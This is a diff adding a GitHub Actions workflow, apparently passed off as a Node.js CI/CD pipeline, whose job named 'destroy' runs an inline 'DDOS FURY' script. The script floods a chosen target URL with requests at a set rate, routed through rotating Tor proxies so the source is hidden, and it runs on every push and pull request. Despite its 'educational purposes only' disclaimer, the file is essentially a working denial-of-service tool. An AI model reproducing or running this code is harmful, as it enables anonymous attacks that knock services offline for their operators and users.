@@ -1,0 +1,87 @@
+name: Node.js CI/CD - FUCK YEAH!
+ 
+
+ on:
+  push:
+  branches: [ main ]
+  pull_request:
+  branches: [ main ]
+ 
+
+ jobs:
+  destroy:
+  runs-on: ubuntu-latest
+  strategy:
+  matrix:
+  node-version: [16.x]
+ 
+
+  steps:
+  - uses: actions/checkout@v3
+  - name: Install Node.js ${{ matrix.node-version }}
+  uses: actions/setup-node@v3
+  with:
+  node-version: ${{ matrix.node-version }}
+  cache: 'npm'
+  - name: Install Dependencies - Get Ready to Rumble!
+  run: npm install chalk figlet yargs request tor-request
+  - name: Unleash the Fucking Fury - DDOS Attack
+  run: |
+  node <<EOF
+  const figlet = require('figlet');
+  const chalk = require('chalk');
+  const argv = require('yargs')
+  .usage('Usage: node $0 -t [target URL] -r [requests per second]')
+  .demandOption(['t', 'r'])
+  .help()
+  .argv;
+  const target = argv.t;
+  const rps = parseInt(argv.r);
+  const torRequest = require('tor-request');
+ 
+
+  console.log(chalk.green(figlet.textSync('DDOS FURY', { font: 'slant', horizontalLayout: 'full' })));
+  console.log(chalk.red('WARNING: This tool is for educational purposes only. DO NOT use it against systems you do not own or have permission to test.'));
+  console.log(chalk.red('DISCLAIMER: I am not responsible for any damage caused by the misuse of this tool.'));
+  console.log(chalk.blue('Target: ' + target));
+  console.log(chalk.blue('Requests per second: ' + rps));
+ 
+
+  let requestsSent = 0;
+  let errors = 0;
+  let torProxies = [
+  'socks5://127.0.0.1:9050',
+  'socks5://127.0.0.1:9051',
+  'socks5://127.0.0.1:9052'
+  ];
+ 
+
+  function getRandomProxy() {
+  return torProxies[Math.floor(Math.random() * torProxies.length)];
+  }
+  function attack() {
+  const proxy = getRandomProxy();
+  torRequest({
+  url: target,
+  proxy: proxy,
+  timeout: 10000
+  }, (error, response, body) => {
+  requestsSent++;
+  if (error) {
+  errors++;
+  console.log(chalk.red('Error: ' + error));
+  } else {
+  console.log(chalk.green(`Request sent: ${requestsSent}, Status: ${response.statusCode}, Proxy: ${proxy}`));
+  }
+  });
+  }
+ 
+
+  setInterval(attack, 1000 / rps);
+ 
+
+  setInterval(() => {
+  console.log(chalk.magenta(`Total Requests: ${requestsSent}, Errors: ${errors}`));
+  }, 5000);
+  EOF
+  shell: bash
